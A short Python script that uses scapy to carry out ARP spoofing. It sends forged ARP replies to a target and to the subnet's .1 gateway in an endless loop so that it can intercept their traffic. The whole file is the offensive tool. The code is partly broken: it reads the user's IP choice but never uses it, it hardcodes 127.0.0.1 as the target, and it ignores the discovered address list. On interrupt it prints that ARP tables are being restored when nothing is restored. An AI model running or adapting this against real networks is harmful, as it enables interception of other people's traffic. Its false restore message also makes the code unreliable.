import scapy.all as scapy
import time
import Local_address

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def ARP_spoofing():
    try:
        choose = int(input("\n\nChoose the IP address: "))
        target_ip = "127.0.0.1"
        # Using split and join method to spoof IP so it will be safer from possibility of target IP range and length
        spoof_ip = '.'.join(target_ip.split('.')[0:3]) + '.1'
        print("Intercepting right now!!")
        while True:
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)
            time.sleep(2)  # Delay between spoofing packets

    except KeyboardInterrupt:
        print("\nARP spoofing stopped. Restoring ARP tables...")


if __name__ == '__main__':
    ip_list=Local_address.info()
    ARP_spoofing()

